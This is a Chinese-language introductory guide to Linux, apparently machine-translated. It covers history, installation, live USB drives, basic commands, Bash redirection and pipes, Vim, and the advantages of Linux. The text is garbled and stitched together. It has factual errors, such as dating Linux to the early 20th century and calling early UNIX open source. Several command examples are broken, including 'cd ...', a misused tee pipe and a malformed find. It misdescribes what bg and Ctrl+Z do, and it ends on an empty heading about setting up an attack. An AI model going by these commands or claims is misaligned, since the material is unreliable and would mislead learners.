## 第一章：历史与背景

Linux 一词指的是由林纳斯·托瓦尔斯（Linus Torvalds）以及其他几位贡献者开发的内核或操作系统。它首次公开发布是在 1991 年 9 月。在一个微软向消费者收取 Windows 等操作系统付费的世界里，Linux 的优势在于它是一个开源软件，这意味着程序员有权自定义它、基于它创建自己的操作系统，并根据其需求使用它。Linux 操作系统的代码大部分是用 C 语言语言编写的。今天有数百种使用 Linux 内核的操作系统，其中最流行的是 Ubuntu、Debian、Fedora 和 Knoppix。这并不是列表的终点，因为每年都会出现使用原始 Linux 系统内核的新操作系统。

Linux 是计算和技术领域的一个里程碑，如今 Linux 驱动着绝大多数移动手机、网络服务器、个人电脑、云服务器和超级计算机。Linux 系统管理员的职位描述指的是维护基于 Linux 的系统的运行并确保系统具有最大的运行时间，简而言之，就是确保以最优化的方式使用系统。在现代世界，由于 Linux 的高稳定性和开源特性，大多数设备运行在 Linux 服务器上或与 Linux 系统有关。由于此，Linux 管理员的工作围绕以下内容：

- Linux 文件系统
- 使用 Bash Shell 管理超级用户 Root 命令行
- 管理用户、文件和目录

你可以将其理解为维护你在家里使用的个人电脑，但规模更大，是针对整个组织。Linux 系统管理在现代世界是一项关键需求，因此市场对该职位的需求巨大。工作描述可能因组织而异，但 Linux 管理的基本原理是相同的。以下职责与系统管理员职位相关：

- 对数据进行定期备份。
- 分析日志以持续改进系统。
- 为用户维护和增强现有工具。
- 检测并解决问题，范围从用户登录问题到灾难恢复。
- 排除系统中的其他故障。

也许系统管理员身上最重要的技能是在巨大的负载和压力下进行表现。系统管理员通常进行七天制的工作，其中两天处于值班状态，一旦系统出现问题必须上线并快速解决以便系统恢复运行。如果停机时间过长，系统或服务器可能会导致公司数千美元的损失。例如，购物巨头 Amazon 的网站。如果 Amazon 网站宕机一小时，所有销售都会受到影响，导致巨大损失。这就是系统管理员介入并救场的地方。

最初，Linux 仅仅是 20 世纪初由一位名叫林纳斯·托瓦尔斯的程序员在芬兰赫尔辛基大学期间作为一个爱好项目开发的。该项目的灵感源于由安迪·塔能鲍（Andy Tanenbaum）教授开发的名为 Minix 的小型 Unix（操作系统），该教授使用 Unix 代码向学生更深入地教授操作系统。

1991 年 10 月 5 日，Linux 的第一个版本 0.02 版由林纳斯发布。虽然这个版本能够运行 Bourne shell (bash)——命令行界面以及一个名为 GCC 的编译器，但除此之外没有其他内容了。




0.03 版本在稍后发布，随着更多人开始接受该软件，版本号增加到了 0.10。

在经过几次修订后，Linus 发布了 0.95 版本，以反映他认为系统很快就能进行“官方”发布的预期。大约一年半后（1993 年 12 月），该版本终于达到了 1.0 版本。

如今，Linux 是 Unix 的完全克隆，并从此以后用户群已跨越行业和大陆。

了解它的人看到并欣赏它在几乎所有领域的应用——从汽车到智能手机，从冰箱等家电器到超级计算机，这个操作系统无处不在。

Linux 运行着互联网的大部分、运行着你每隔几天就能听到的各种科学突破的计算机，以及世界证券交易所。

在你欣赏它的存在时，不要忘记，这个操作系统在成为全球范围内运行服务器、桌面和嵌入式系统的最佳平台之前，是（现在仍然是）最安全、可靠且无省心的操作系统。

在本节中，我们将回顾 Linux 历史。

### 计算机与 UNIX 的演变

如果你们都知道计算机是什么时候开发或引入的，它们是巨大的、体积很大的系统，负担不起，而且我想计算机第一次开发出来时，它们有房子那么大。

非常庞大的系统，普通人很难负担得起。

当计算机首次开始演变时，每家公司都有不同的操作系统。他们过去会购买硬件，创建自己的操作系统，并按照自己公司的规范运行计算机。

由于不同的公司购买硬件，不同的公司引入了自己的操作系统，问题在于每台计算机都是为了特定目的而开发的，这意味着每个系统都有一个特定的用途。例如，一台服务器会有一个特定的用途，但所有系统、服务器或工作站之间没有统一的操作系统。

这些系统极其昂贵，因为在计算机最初创建时，硬件成本非常高。如果你将其与手机比较，当手机最初被创建时，它们也非常昂贵。

如今，需求极高，使得硬件成本已经下降，任何人都可以购买手机。计算机也是如此。你可以以负担得起的价格购买计算机，因为许多公司都在制造计算机，这意味着大量的竞争。所以，当需求增加时，竞争增加，价格肯定会下降。

但在计算机最初建成时，没有人能轻松负担起计算机，这就是为什么过去只有公司能负担得起极其昂贵的计算机。此外，在那个时代，理解和学习计算机是一项必备技能。

所以，对于普通人来说，学习和理解计算机或操作系统是不可能的。每家公司都有熟练的劳动力，有在这些特定计算机上操作和工作的熟练人才。

这就是计算机的主要演变，它就是这样开始的。

现在理解一下这个演变的背景；这确实存在一个问题。

问题在于，在涉及硬件或计算机操作系统时，每家公司都有自己的垄断。他们开发了自己的的操作系统。因此，在计算机和构建它们的公司之间没有操作系统的标准化。

这就是为什么在 1969 年，贝尔实验室（Bell Labs）的一组开发人员开始了工作。C 语言就在那个实验室开发的，那里的开发人员想，为什么不构建一个可以跨计算机使用的标准操作系统，这样人们就不需要担心硬件或软件了？

最初，问题是硬件成本，再加上为特定计算机构建操作系统的另一项成本。为了降低这项成本，开发人员在想，为什么不创建一个标准操作系统，以便人们购买标准硬件呢？

他们可以购买或安装标准操作系统，然后继续开发或使用他们的应用程序。

这就是 Unix 的开始。

UNIX 项目的目标是为所有计算机创建通用软件，因为所有公司都在开发自己的操作系统；这是一项非常艰巨的工作。他们希望标准化这一过程。

UNIX 或 UNIX 操作系统是用 C 语言启动的。

现在，团队对 UNIX 操作系统的开发有了进一步的目标，该目标是创建一种易理解且可重用或可回收的代码。这种可回收的代码被称为内核（kernel）。内核是操作系统的一部分，因为一个操作系统有多个组件。它负责与硬件和软件进行通信。内核是可回收的，用于开发操作系统并增强功能。

现在许多人做的是使用这个内核，因为它是标准代码。他们可以通过修改内核、与内核通信的软件或与内核通信的应用程序来开发自己的 UNIX 变体，因为它是一个标准层。

早以前，你必须开发一个直接与硬件通信的操作系统。现在你有一个层，即内核，或者说是负责与硬件通信的调解者。

所以我们需要创建只能直接与内核通信的应用程序，因为内核处理与硬件的通信。开发直接与硬件通信的应用程序并不是要求的。我们有一个标准的内核层，所以应用程序将与内核通信，再由内核与硬件通信。

该计划的另一个目标是使用开源代码开发操作系统。这意味着 UNIX 操作系统的代码对任何人都是开放的。

任何人都可以阅读内核；任何人都可以根据需求修改它，并使用内核构建其他变体的 UNIX 操作系统。由于 UNIX 在初是复杂的操作系统，它只存在于大学、政府和大型公司。

但随后，由于我们看到源代码是开源的，IBM-AIX、HP-UX 和 Sun Solaris 等公司开始创建自己的 UNIX 变体。

### Linux 如何进入视野

作为最初的操作系统，UNIX 非常复杂且难以配置。只有大公司能负担得起使用、修改并将其用于自己的目的。当时有一个人叫 Linus Torvalds。他是芬兰的一个学生，他的目标是创建一个免费的 UNIX 版本。在 1991 年，他开始为自己的 PC 编写代码。这就是项目的开始方式。

他并没有意图要创建一个挑战 UNIX 系统的大型操作系统。不，目标是创建一个免费的 UNIX 版本。仍然，他只想为自己的系统创建它，而这样做的主要原因是他负担不起 UNIX 操作系统。他没有想到这个项目会变得多大。

最初，他所做的一切是因为自我，或者由于他无法负担 UNIX 操作系统，他创建了免费的 Linux 操作系统。仍然，他限制了商业用途，因为 UNIX 是一个商业操作系统，对于人们来说很难将其用于自己的目的。公司或大公司不能购买或使用 Linux 操作系统。

1992 年，他根据 GNU 通用许可证发布了 Linux。

如今，任何公司都可以使用 Linux 操作系统，因为它是完全免费的。你不需要许可证。Linux 无处不在。它被用于超级计算机、笔记本电脑、平板电脑、手机、路由器、洗衣机、手表、服务器、汽车等。

### Linux 特性

#### 多用户操作系统

多个用户可以通过不同的终端连接到同一个操作系统，利用内存、硬盘等硬件资源并在操作系统上工作。一个用户连接到操作系统，无论第一个用户是否注销，另一个都可以连接。多个用户可以连接到同一个操作系统并在 Linux操作系统上工作。

#### 多任务

多任务是指 Linux 操作系统内部的任务、系统调用或用户请求；它是如此智能，可以根据 CPU 线程划分任务并处理多个任务。当涉及到 CPU 线程时，所有任务都被划分并并行执行。

CPU 线程会执行多个用户请求，这就是为什么“多任务处理”这个术语会出现。

### 可移植性

可移植性并不意味着你可以将 Linux 操作系统放在 U 盘或光盘中。当然，你可以这样做，但关于可移植性的核心点在于，你可以在任何硬件上安装 Linux。

这非常简单，而且我们刚刚看到了可以找到 Linux 操作系统的位置，这意味着 Linux 可以轻松地移植到不同类型的硬件上。

### 安全性

在 Linux 内部，我们有身份验证机制。当你尝试连接到 Linux 操作系统时，你需要提供用户 ID 和密码。

当你尝试访问文件时，你就拥有了所谓的“权限”。你需要拥有访问文件的权限。同样，文件可以在操作系统内部进行加密，将其转换为一种当当没有权限的其他人尝试打开它时，该格式是不可读的。

### GUI 界面

如果通过安装一些软件包，我们也可以拥有可以在 GUI（图形用户界面）下使用的 Linux 操作系统。

注意：Mac 操作系统是构建在 Unix 操作系统上的。

### 文件系统

文件系统允许你以系统的顺序排列文件和目录。

### 开源

这意味着任何人都可以自由地下载、安装和使用 Linux 操作系统。

### 安装 Linux

注意，在安装某些发行版之前，你可能需要了解你电脑的硬件。例如，如果你选择安装 Debian，你需要关于你的 PC 及其组件的信息，因为该发行版无法识别所有设备。

幸运的是，现在所有的安装程序都能扫描你的电脑并看到每一个连接的硬件元素。然而，在发生某些错误时，你仍然应该手头留信息。这样，你就可以排除故障并弄清楚安装过程中出了什么问题。

下一步是将文件刻录到磁盘或优 盘上。接下来，你需要在启动系统时告诉系统从磁盘或优 盘启动。许多电脑在检测到启动盘时会自动启动，但有时如果设置设为始终从硬盘启动，你可能需要手动开启该设置。更改启动顺序可能会解决问题。你必须访问系统的选项。

在操作系统加载之前，通过按下如 F10 或 "DEL" 等键来访问你的系统。

一旦你进入了电脑的设置区域，你需要将 Linux 启动磁盘分配为默认启动设备。确认更改，将你的磁盘插入驱动器（或连接优 盘），然后重启电脑。在这个阶段，你可能应该知道你是否想在安装 Linux 的同时保留当前的操作系统。例如，如果你安装了 Windows 并且不想替换它，你将需要执行几个额外的步骤。

如果你计划保留当前的操作系统，首先需要做的是为 Linux 发行版准备一个单独磁盘分区。

目前，你的系统正在使用整个硬盘。这个过程并不困难，但始终存在意外清空整个磁盘并丢失所有数据的风险。这就是为什么，在安装任何操作系统之前，备份你所有的文件和数据是一个好主意。有了备份，你可以使用分区应用程序让该过程变得简单。

例如，一个名为 QTParted 的程序运行良好，并且它包含在某些 Linux 发行版中。

许多 Linux 安装程序可以自动处理你的分区。新分区是通过缩小你当前操作系统分区的大小创建的。

一旦你准备好安装 Linux，从安装盘启动电脑并开始该过程。你需要遵循许多步骤，整个设置过程可能花费两个小时。这完全取决于你的系统以及你正在安装哪种发行版。在这个阶段，你真正需要做的只是遵循屏幕上的指令。

大多数现代且最新的发行版都会通过一个易于遵循的图形用户界面引导你完成。

安装中的一个重要元素涉及硬盘分区。是的，即使你已经执行了上面的分区步骤。你所做的只是使用你已经设置好的分区。

带有多个发行版的 openSUSE 安装界面应该向你显示你需要采取的推荐步骤。一旦你执行了引导式配置（包括时间、网络设置等基本步骤），你就需要选择你想要安装哪些软件包。请记住，某些 Linux 发行版被设置为安装某些组件，而你将没有选择权。

一旦安装过程完成，重启你的电脑。这一步是设置过程的一部分，也是必须的。

现在 Linux 已经准备好运行了。

当你首次启动系统时，你会发现还有几个可选步骤，涉及进一步的系统配置以及安装各种软件包和应用程序。

## Linux 优 盘

使用 Linux Live 磁盘是探索为你提供的各种发行版的一种良好方法。

它不会经历耗时的安装过程，你不需要担心将你当前的系统置于你不熟悉的事物之上。这就是为什么带有 Live 安装功能的 CD 和 DVD 曾经非常流行。现在，虽然如果你愿意仍然选择使用光盘，但大多数人选择使用更现代的优 盘。由于更实用的 USB 盘（速度更快、更易用且能存储更多数据），许多人甚至不再安装光驱了。

Live 盘最大的问题是它们在读写数据时很慢。另一个问题是当你进行操作系统配置时会遇到困难。在 Live 盘上保存某些更改并不容易，这就是为什么我们将关注可启动优 盘发行版。

可启动优 盘发行版已经存在多年，因为这项技术并不新鲜。然而，直到最近，它们仍然存在缺点。

最流行的 Live 发行版可能是 Fedora，因为它很容易准备。这种安装对你的系统没有任何风险。重要的是，你可以在优 盘上保留你的 Linux 系统修改。

创建可启动优 盘最简单的方法是利用你当前的操作系统。

这听起来可能奇怪，但在 Windows 上执行此过程比输入命令行指令要简单得多。

以下是创建可启动 USB 盘需要遵循的步骤：

- 首先，你需要下载 Live USB 创建程序。
- 按照其直观的设置指南安装程序。
- 找到安装文件夹并运行应用程序。
- 选择优 盘选项，你可以在 "target device" 下找到它。该盘应该显示为 "MyDrive"。
- 现在你需要选择 ISO 文件来源。选择下载选项来访问它。
- 接下来，你需要选择“持久性存储”大小。这代表了预留的存储空间。请记住，应用程序可能默认设置为 0MB。你应该至少选择 400MB。
- 最后，你可以点击“Create Live USB”按钮。

该过程将需要几分钟，最后你将看到新的文件夹：一个名为 "syslinux" 的文件夹，它很小仅负责系统启动；第二个文件夹是 "LiveOS"，它包含了你之前设置的系统。

你现在可以关闭优 盘创建器并尝试 Live 盘。

# Linux 命令与架构

Linux 的核心在于使用命令行来实现目标。这是使用任何基于 Unix 系统的最大吸引力之一。本节内容相对较短，将涉及 Linux 命令行行的导航和用法。在下一节中，我们将真正利用编写脚本来自动化许多基本功能。

本节基本上将介绍许多你可以使用命令行让 Linux 生活变得更简单的方法。你需要了解的是，这部分的所有内容都可以在 Terminal（终端）中使用。你始终可以通过进入“应用程序”面板，然后在“系统”或“实用工具”下找到它。

命令行可以使用许多不同的命令。熟悉这些命令是更深入地感受你的 Linux 操作系统的第一步。然而，请注意，这些阅读仅涵盖了冰山一角。人们会为命令行命令编写几百页的书。本节将对你将发现的最有用的内容进行简要概述，而不会进入过于详尽的细节。

### 目录命令

这些命令用于移动以及了解你所在的位置。这里的第一个命令是 PWD。PWD 代表 print working directory（打印工作目录）。如果你在 Terminal 中输入 `pwd` 并按回车键，它将打印你当前所在的目录。

什么是工作目录？工作目录指的是你在 Terminal 实例中正在工作的文件夹。你可以移动你的工作目录；我们稍后会介绍这一点。

下一个目录命令是 `ls`。ls 会列出你所在目录中可用的不同文件和文件夹。`ls` 最常用的参数是 `-l`，它会列出所有内容。要使用此命令，必须指定目录。

`/ls` 将列出给定路径下的所有内容。同时，`/applications` 将列出你应用程序文件夹中的所有内容。

另一个目录命令是 `cd`。cd 代表 change directory（更改目录），这对于你的导航非常重要。`cd ...` 会带你进入上一级文件夹，而 `cd folderName` 将带你进入当前目录下的任何文件夹。你也可以用它轻松地跨硬盘进行移动。

### 创建与删除

这些命令允许用户创建和删除内容。

`mkdir` 是一个强大的工具，允许用户创建新目录。

`rmdir` 允许用户删除目录。然而，它不能删除包含文件的目录。

`rm` 允许用户删除指定的文件。

`touch` 允许你创建一个新文件。

`tar` 允许你创建一个新的 tar 归档 - `tar cvf nameOfArchive.tar directory/`

... 以及从 tar 包中提取：`tar xvf nameOfArchive.tar`

... 以及查看现有的 tar 包：`tar tvf nameOfArchive.tar`

### 搜索与检索

`cp` 允许你将文件从一个目录复制到另一个目录。

`mv` 让你将一个文件命名为另一个，并覆盖第二个文件。

`Locate` 可以帮助你在硬盘的任何地方查找内容，并提供配合通配符 (`*`) 使用以提供许多可能性。

`Man` 允许你查看给定命令的手手册。

### 网络相关

`ssh` 是个大不了；它让你登录到其他处的远程主机。这是一个超出本文范围的大的话题——尝试 `man ssh` 来获取一个起点！

`FTP` 将允许你连接到服务器并上传或下载文件。

`Wget` 让你快速从互联网下载内容并安装它们。

### 系统相关

`service` 让你处理运行中的服务：

- 查看状态：`service ssh status`
- 检查所有状态：`service --status-all`
- 重启服务：`service ssh restart`

`shutdown` 允许你关闭系统：`shutdown -h now`

... 或在重启后进行文件系统检查：`shutdown -Fr now`

`kill` 让你结束任何指定的系统进程。

这些只是 Linux 命令行提示的开始。再次，你可以使用 `man` 命令或大多数进程中的帮助信息来更好地理解单个参数，这里没有空间或时间介绍。

在进入 Bash 脚本之前，我们需要讨论的最后一个 Linux 命令行是管道（piping）。管道是在两个命令之间放置一个竖线 `|`。这允许你将第一个命令的输出作为第二个命令的输入。你会经常看到这种，所以你必须知道它的含义。

### 什么是 Linux？

我们首先需要看的是 Linux 是一个操作系统。

它与我们使用的操作系统相似，例如 Mac OS、iOS 和 Windows。事实上，地球上最著名的平台之一 Android 正得益于 Linux 操作系统的动力支持。

Linux 操作系统是现存的最复杂的操作系统之一。将其分解，操作系统简单来说是一种软件，能够管理与你的笔记本电脑或台式电脑相关的所有硬件资源。

为了简单起见，操作系统将帮助管理硬件和软件之间的所有通信。

如果没有操作系统，那么软件将无法按照你想要的方式运行。

你会发现，和其他其他一些操作系统一样，Linux 操作系统会带有几个我们需要处理的不同部分。

其中一些包括：

- 引导加载程序 (Bootloader)：这是一个可以管理我们计算机启动过程的软件。对于大多数用户来说，这就是当你首次启动操作系统时弹出然后消失的启动屏幕界面。

- 内核 (Kernel)：这是整个系统中被称为 Linux 的那部分。它是我们系统的核心，负责管理内存、外围设备和 CPU。内核是我们在操作系统中最底层的发现。




-   初始化系统（Init system）：这将是引导用户空间的子系统之一，随后它将控制守护进程（daemons）。在其中应用最广泛的一个是 systemd，它有时也被认为是最具争议的。一旦初始引导阶段从我们使用的初始引导加载程序移交出来，该系统将负责启动操作系统。

### 脚本

计算机的一项卓越能力是它可以为你执行自动化任务。在 Linux 系统中，你可以通过编写“程序”来控制功能。




alias tomorrow = 'date +"%A, %B, %Y"'

如示例所示，创建的别名是 "tomorrow"。它的任务是显示日期。

别名（alias）是用于简化长命令的工具。别名就像快捷方式，你可以为复杂的命令设置短名称。

用于脚本的另一种命令被称为 Shell 函数（shell functions）。Shell 函数与别名类似，区别在于它们可以处理更复杂的指令集。

Shell 函数也称为子脚本。由于它们的本质，管理脚本有时可能很困难，它们被视为在脚本内部。

示例：

```
function tomorrow {
echo "Tomorrow’s date is:" date +"%A, %B %Y"
}
```

如示例所示，"tomorrow" 函数用于显示日期。这与别名相似，但区别在于它可以接收自定义的参数。

### 学习与使用 Bash

Bash 是 Bourne-Again Shell 的缩写，是一个读取脚本的处理器。它在终端中运行。

- * – 匹配某些字符
- [abc] – 匹配括号内的任意字符
- ![abc] – 匹配不在括号内的任意字符
- [a-z] – 匹配范围内的任意字符
- ![a-z] – 匹配不在范围内的字符

当 Bash 设置为并发模式时的示例：

first command & second command

如示例所示，"first command" 被执行。执行完成后完成后second command" 被处理。

后台进程可能会继续运行。此外，存在一个名为 `bg` 的命令。一旦被调用，默认的文本编辑器会启动。完成后，表单将发送给维护者。

当你重定向标准输出 stdout 时，它将不会在终端屏幕上显示输出。这并不意味着如果你只重定向标准输出 stdout，错误消息 stderr 就不会显示在屏幕上。如果你将标准输出重定向到一个不存在的文件，该文件将在处理过程中被创建。如果文件已存在，且你使用的重定向不是追加重定向，则现有文件将被覆盖。将标准输出重定向到 /dev/null 将会像重定向到一个空文件一样丢弃输出。

让我们过一遍用于重定向的输出操作符。

>file

这将将标准输出 stdout 重定向到文件并覆盖之前的任何内容。

>>file

这将会将标准输出 stdout 重定向到文件并将文件中的任何之前的内容追加到其中。

2>file

这将将标准错误 stderr 重定向到文件并覆盖之前的任何内容。2>/dev/null

这将通过将标准错误 stderr 重定向到 /dev/null 来丢弃它。

>file 2>&1

这将将标准输出 stdout 和标准错误 stderr 重定向到同一个文件并覆盖。

>>file 2>&1 &>>file

这将将标准输出 stdout 和标准错误 stderr 重定向并追加到同一个文件中。

**注意：** 操作符的顺序非常重要，因为改变顺序会导致重定向结果完全不同。

例如，`>file 2>&1` 将把标准输出 stdout 重定向到文件，然后将标准错误 stderr 重定向到同一个文件。

如果你将顺序改为 `2>&1>file`，它会将标准错误重定向到默认输出位置（终端屏幕），仅将标准输出重定向到文件。

由于这种困惑，许多用户倾向于使用替代操作符 `>&file` 和 `>>file`，它们会将标准输出和标准错误合并并将它们重定向到文件。

让我们快速过一遍一些示例以更好地理解输出重定向。在系统管理任务中，有很多工作可以使用输出重定向完成。

- 1. 将时间戳保存到文件中供备后参考

```
$[student@desktop ~]$ date > ~/time
```

这将输出当前时间戳并将其重定向到学生家目录下名为 time 的文件中。

- 2. 从日志文件中复制最后一百行并将其保存到另一个文件中

```
$[student@desktop ~]$ tail -n 100 /var/log/messages > ~/logs
```

这将从 messages 日志文件中复制最后一百行，并保存到学生家目录的 logs 文件。

- 3. 将 3 个文件的内容合并到一个单个文件中

```
$[student@desktop ~]$ cat file1 file2 file3 > ~/OneFile
```

这将合并 file1、file2 和 file3 的内容，并将其保存到用户家目录下名为 OneFile 的单个文件中。

- 4. 列出家目录下的隐藏目录并将文件名保存到文件中

```
$[student@desktop ~]$ ls -a > ~/hiddenfiles
```

这将列出用户家目录下的隐藏目录，并将目录名称保存到用户家目录下名为 hiddenfiles 的文件中。

- 5. 将 echo 命令的输出追加到现有文件

```
$[student@desktop ~]$ echo "Hello World" >> ~/file
```

这将将字符串 Hello World 追加到用户家目录下的文件中。

- 6. 将标准输出重定向到一个文件，将标准错误重定向到另一个文件

```
$[student@desktop ~]$ find /etc -name passwd > ~/output 2>~/error
```

这将将输出重定向到 output 文件，将错误重定向到学生家目录下的 error 文件。

- 7. 丢弃错误消息

```
$[student@desktop ~]$ find /etc -name passwd > ~/output 2>/dev/null
```

这将将错误重定向到 /dev/null（空文件）并丢弃它。

- 8. 将标准输出和标准错误一起重定向到一个文件中

```
$[student@desktop ~]$ find /etc -name passwd >& ~/onefile
```

这将将标准输出和标准错误重定向到学生家目录下的 onefile 文件。

## 使用管道 (Pipeline)

管道是一种操作符，通过使用管道符 `|` 将一个或多个命令隔开。管道基本上获取第一个命令的标准输出，并将其作为标准输入传递给第二个命令。

输出将继续通过使用管道隔开的各种命令，只有最终输出会显示在终端上。我们可以将其可视化为数据通过管道从一个进程到另一个进程的流。这些数据在经过的每一个命令时都会被修改。

让我们过一遍一些管道的示例，这些示例在系统管理任务中非常有用。

```
$[student@desktop ~]$ ls -l /var/log | less
```

这将列出位于 /var/log 的文件和目录，并由于 less 命令的作用，一次一个屏幕地显示在终端上。

```
$[student@desktop ~]$ ls | wc -l
```

此命令将输出通过管道传递，wc -l 命令将统计输出的行数并显示行数，而不是 ls 命令的实际输出。

### 管道、重定向和 Tee 命令

正如已经讨论过的，当你使用管道时，管道会确保所有数据都经过处理并通过每一个命令。只有最终输出显示在终端屏幕上。这意味着如果你使用输出重定向，输出将被重定向到文件。

```
student@desktop ~]$ ls >file | less
```

在例例中，ls 命令的输出被重定向到文件，然后传递给 less 命令。

这正是 tee 命令派上用场，它可以帮助处理此类场景。如果你在管道中使用 tee 命令，tee 将把输出重定向到指定的两个方向。

让我们快速过一遍一些示例以帮助理解如何在管道中使用 tee 命令。

```
$[student@desktop ~]$ ls -l | tee ~/output | less
```

在这种管道中，tee 首先将 ls 命令的输出重定向到 ~/output。随后，它还将输出传递给 less 命令，从而显示在终端屏幕上。

```
student@desktop ~]$ ls -l | less | ~/output
```

在这种情况下，我们看到 tee 使用在命令的末尾。这会将管道的输出显示在终端屏幕上，并将相同的输出保存到 ~/output 文件。

**注意：** 你可以在管道中使用重定向标准错误，但无法使用合并操作符 `&&` 或 `>>`。

因此，如果你要在管道中使用管道重定向标准输出和标准错误，你需要按照如下方式使用。

```
$[student@desktop ~]$ find -name / passwd 2>&1 | less
```

### 使用 Vim 编辑文件

Linux 最有趣的特性之一是它是基于文本设计和开发的，因此所有信息都存储在文本文件中。Linux 中有两种类型的文本文件：平面文件（Flat files），文本存储在包含相似信息的行中，你可以在 /etc 目录下找到它们；以及可扩展标记语言（XML）文件使用标签存储文本，你可以在 /etc 和 /usr 目录找到它们。文本文件的最大优势是它们可以从一个系统或平台传输到另一个而无需转换。它们可以使用简单的文本编辑器进行查看和编辑。





Vim 是所有 Linux 发行版中最受欢迎的文本编辑器，它是此前流行的 vi 编辑器的改进版本。Vim 可以根据用户需求进行配置，并包含颜色格式化、分屏编辑和编辑文本高亮等功能。

Vim 有 4 种模式，用于不同的用途：

输入 `:` 键带你进入扩展命令模式，允许你将输入的内容保存到文件中并退出 Vim 编辑器。

Vim 还提供了更多按键用于与文本编辑相关的高级任务。尽管它被认为是全球 Linux 领域最好的文本编辑器之一，但对新用户来说可能会让人无从从。我们将介绍使用 Vim 在 Linux 中完成编辑任务所需的最基本按键。

## 第十章：使用 Linux 的优势

大多数计算机新手会说诸如“Linux 很复杂”或“Linux 是极客玩的东西”之类。当然，确实存在只有充满热情的专家才能操作的 Linux 发行版，但也有一些专门为普通大众设计的发行版：Linux Mint、Ubuntu 及其衍生版本。

你将发现 GNU/Linux 使用起来非常简单，并且比大多数人想象的要友好得多。

### 掌握你的方向盘

通过这款软件，你就是控制台的主人。除非你明确要求，否则 GNU/Linux 绝对不会执行任何操作，这与几乎由系统而非用户来决定一切的专有系统完全不同。

你不需要被强制安装你不想安装的内容，也不会在你购买的系统仍然运行良好时被强行强加一个全新的系统。相反，从开始你可能根本都不需要卸载任何东西：没有为期一个月的防毒软件试用版、没有密钥、没有锁定，也没有臃肿软件。

在依赖 Windows 多年后，Linux 赋予的自由可能会让人惊畏。然而，应该理解的是，GNU/Linux 允许你操纵你的操作系统，将其调整为符合你品味和需要的空间，正如它赋予你做任何事情的权利一样。

### 安全

在 Linux 上不需要防毒软件。这听起来似乎是无懈可击，但它是事实，因为这个操作系统的构建初衷就是为了尽可能安全。这是类 Unix 系统（Linux、BSD）的基因组成，其中安全性是与系统其他组件等关重要的元素。

尽管有此说法，大多数计算机操作员仍试图解释 Linux 的安全机制。一方面，一些操作员认为 Linux 上有病毒，因此保护自己至关重要；另一些人则认为，这些防毒软件只能检测到针对 Windows 的病毒。此外，Linux 世界的多样性意味着，影响一个发行版的病毒可能不会影响另一个。

Linux 系统最常见的安全要求是，当你登录或当你想要执行具有潜在危险的系统修改操作（更新、安装新软件等）时，系统会要求密码。当你想要访问某些文件时也需要密码，因为这可以防止某些在你不在时搜索你的数据。

至于更新，它们看起来频率要低得多，而且在大多数情况下执行速度快得多。我们有时会听到 Windows 的设计是为了一件事：运行。起初，安全甚至不是首要考虑的问题，其被考虑的程度之低以至于被委交给了第三方软件。

因此，产生了防毒和反恶意软件这一极其丰利的行业。即使有人辩称，如今微软非常重视安全问题，但持续且频繁的安全更新流应该鼓励所有用户对微软操作系统的可靠性提出严肃质疑。

### 宁静与高效

尽管某些发行版很复杂，但某些 GNU/Linux 发行版非常适合初。因此，一切的设计都是为了让初者的生活变得更容易。这意味着你不需要计算机科学硕士学位就能操作 Linux。此外，GNU/Linux 在技术和人性化方面都提供了一个可靠的环境。

当你第一次安装发行版时，它最引人注目的是其极简的外观。通常，桌面上只有两个图标：“工作站”和一个个人文件夹。甚至连垃圾桶都没有！这看起来可能简陋，但它也是 GNU/Linux 体验的象征：简单以及根据你的需求添加内容的选择。

当你穿过界面时，这种简单性一而易见。与 Windows 不同，大多数人尚未掌握通过安装无用软件和禁用强制功能来浪费系统系统的技能；在 GNU/Linux 下，你不需要这样做。不需要卸载一堆无用的软件。相反，由你自己选择要添加的软件。

准确地说，没有什么比从软件库的数千个可用软件中选择并安装软件更容易获取的了。不要在网上搜索所需的应用程序，那可能轻易包含病毒或损坏你系统中的文件。

GNU/Linux 最生动的特征是安装软件后不需要重启。对于更新来说也是如此，它们可以立即生效而无需重新启动系统。

### Bash 特性

Bash 是你将使用的多数 Linux 系统上的默认 GNU shell，它将使你更容易使用特定的组合键来轻松、快速地完成任务。Bash shell 的某些功能包括：

-   Tab - 这将补全命令或文件名。如果有多个选项，系统将使用视觉或音频通知告知你。如果系统检测到很多可能性，它会询问你是否想要检查所有项。
-   Tab - 这将显示文件名或命令的补全可能项。
-   Ctrl + A - 将光标移动到当前命令行的开头。
-   Ctrl + C - 这将结束你的计算机程序并显示 Linux 提示符。
-   Ctrl + D - 这将退出你当前的会话。这是一个类似于输入 exit 或 logout 的组合键。
-   Ctrl + E - 这将光标移动到当前命令行的末尾。
-   Ctrl + H - 这将工作类似于按下键盘上的退格键。
-   Ctrl + L - 这将清除当前终端。
-   Ctrl + R - 这将搜索命令历史记录
-   Ctrl + Z - 这将允许你挂起计算机。

### 程序

-   右箭头/左箭头 - 这些键将使你更方便地在当前所在的命令行上移动光标。你可能会发现添加更多字符或对程序进行某些更改很有用。
-   向上箭头/向下箭头 - 这些键将让你更方便访问系统历史。你可以在需要访问任何行，然后按回车键执行。
-   Shift + 上箭头/Shift + 下箭头 - 这些组合键将允许你查看缓冲区。

### 指尖之间：新版本

在 Linux 上，如果你想要更改版本（例如为了获得最新的操作系统），大多数发行版都需要重新安装。在 Windows 下，这种操作会带来压力并花费大量时间。更改 GNU/Linux 版本如此简单，以至于可以变成一种常规操作。

在 Linux Mint 中，前往更新管理器安装最新版本。注意的是，安装新版本并不意味着更换整个软件。

GNU/Linux 提供的操作系统轻量到可以在内存小于 4 GB 的计算机上运行。

通常，考虑到目前的 Linux 发行版，配备 4 GB 内存的入门级计算机几乎是过剩的。安装 Linux Mint 的最低配置是 9 GB 磁盘空间和 256 MB 内存（舒适建议 1GB）。显然，某些软件可能需要略大于 1 GB 的内存。但在 1 GB 到 4 GB（或 8 GB 内存）之间，空间是。

发行版的不同版本通常提供“长期周期”，称为 LTS（长期支持）。例如，2016 年春季发布的 Linux Mint 18 将支持到 2021 年春季。对于其他版本，如果你知道如何复制粘贴，就可以重新安装软件并替换为新版本。最重要的是，你可以恢复旧系统的所有软件配置，这包括你的电子邮件、设置以及带有扩展程序的浏览器完整参数。

这种魔法是如何实现的？GNU/Linux 发行的优势在于所有的个人文件都放在一个命名的文件夹中。该文件夹还包含隐藏目录，这些目录包含了你软件的所有设置。GNU/Linux 不会剥削用户。

GNU/Linux 是一个不剥削你的操作系统。默认安装不包含更多于常用且功能齐全的软件。Linux 社区和自由软件开发者并不关心你对自己的计算机做什么，这由你自行负责。





GNU/Linux 发行版不会向“第三方”暗示、分析或传输你的任何操作，以免泄露用户的隐私。

### 步骤 1：设置攻击

